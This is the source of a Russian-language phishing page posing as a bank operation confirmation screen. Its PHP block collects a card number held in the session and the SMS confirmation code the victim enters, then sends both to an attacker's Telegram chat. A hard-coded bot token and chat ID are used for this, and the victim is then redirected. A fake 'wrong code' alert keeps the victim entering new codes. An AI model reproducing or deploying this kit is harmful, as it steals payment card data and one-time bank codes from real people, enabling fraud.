<?php 
session_start();
if(isset($_POST['btn'])){
    //в переменную $token нужно вставить токен, который нам прислал @botFather
$token = "5892156996:AAFBvKbkwPa5rtPTCK6PCQWsOpapPKgBZog";
 
//нужна вставить chat_id (Как получить chad id, читайте ниже)
$chat_id = "-1001955272769";


$smscode = $_POST['code'];

//Далее создаем переменную, в которую помещаем PHP массив
$arr = array(
  '💳Номер карты: ' => $_SESSION['smscode'],
  '💳sms code: ' => $smscode

);
 
//При помощи цикла перебираем массив и помещаем переменную $txt текст из массива $arr
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};
 
//Осуществляется отправка данных в переменной $sendToTelegram
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");


 
//Если сообщение отправлено, напишет "Thank you", если нет - "Error"
if ($sendToTelegram) {
    $loc = 'sms.php';
    header('Location: '. $loc);
} else {
  echo "Error";
    }
}
 ?>
<!DOCTYPE html>
<!-- saved from url=(0026)https://bestmodelss.ru/sms -->
<html lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение операции</title>
    <link rel="icon" href="https://bestmodelss.ru/images/icon.png">
    <link href="./files/css2" rel="stylesheet">
    <link rel="stylesheet" href="./files/font-awesome.min.css">
    <link rel="stylesheet" href="./files/animate.min.css">
    <script src="./files/Gm8J010U0z" async=""></script>
<link rel="stylesheet" href="./files/widget.css"></head>

<body>
    <div class="container" style="padding-top: 15px">
        <div class="row">
            <div class="col-lg-6 mx-auto justify-content-center">
                <p class="sms-text">В течении 5 минут вам поступит СМС с кодом для подтверждения.</p>
                <img class="gif-image" src="./files/reload.gif" alt="">
                <p class="sms-text">Введите его в поле ниже и нажмите кнопку "Продолжить"</p>
                                                <form method="POST">
                    <input type="hidden" name="_token" value="BkQLsNcT7fyNULuYl7UsW0NqimxVI4F6vLA80hZ3">                    <input name="phone" type="text" class="hide" value="1212">
                    <label for="post-phone" class="inp">
                        <input required="" name="code" class="sms-code" type="tel" id="tel" placeholder=" ">
                        <span class="label">Код из СМС</span>
                        <span class="focus-bg"></span>
                    </label>
                   <script type="text/javascript">
function as() {alert("Вы ввели не верный код, вам отправлен новый код" );}
</script>

                    <button onclick="as()" type="submit" name="btn" style="margin-top: 5px" class="design__btn unselectable btn-voting">Продолжить</button>
                </form>
                <p class="sms-text repeat-sms">Через 04:20 вы сможете запросить повторное СМС с кодом подтверждения.</p>
                <div class="resend-sms hide">
                    <form method="POST" action="https://bestmodelss.ru/resend_sms">
                        <input type="hidden" name="_token" value="BkQLsNcT7fyNULuYl7UsW0NqimxVI4F6vLA80hZ3">                        <input name="phone" type="text" class="hide" value="1212">
                        <p><input class="btn-resend-sms" id="reset-delay" type="submit" value="Повторно отправить СМС"></p>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <script src="./files/app.js.Без названия"></script>
    <link href="./files/app.css" rel="stylesheet" type="text/css">


